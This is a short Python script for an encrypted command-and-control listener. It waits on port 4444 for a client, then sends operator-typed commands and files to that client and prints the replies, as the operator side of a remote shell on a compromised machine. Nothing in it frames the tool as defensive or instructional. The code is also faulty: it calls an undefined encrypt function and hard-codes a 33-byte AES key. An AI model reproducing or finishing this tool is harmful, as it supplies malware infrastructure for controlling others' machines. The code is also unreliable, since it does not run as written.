#!/usr/bin/env python3
import socket, hashlib, os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

KEY = b'Your32ByteSecretKey1234567890abc!'  # Change this!
BIND_IP, BIND_PORT = "127.0.0.1", 4444

def decrypt(data):
    iv = data[:16]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(data[16:]), AES.block_size)

def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((BIND_IP, BIND_PORT))
    server.listen(1)
    print(f"[+] Encrypted C2 listening on {BIND_IP}:{BIND_PORT}")

    client, addr = server.accept()
    print(f"[+] Connection from {addr[0]}")
    
    try:
        while True:
            cmd = input("C2> ").strip()
            if not cmd: continue
            
            # File download (server -> client)
            if cmd.startswith("download "):
                file_path = cmd.split()[1]
                if os.path.exists(file_path):
                    with open(file_path, "rb") as f:
                        data = f.read()
                        client.send(encrypt(data))
                    print(f"[+] Sent {file_path} | SHA-256: {hashlib.sha256(data).hexdigest()}")
                else:
                    client.send(encrypt(b"File not found"))
            
            # Other commands
            else:
                client.send(encrypt(cmd.encode()))
                if cmd.lower() == "exit": break
                print(decrypt(client.recv(4096)).decode())
                
    finally:
        client.close()
        server.close()

if __name__ == "__main__":
    start_listener()
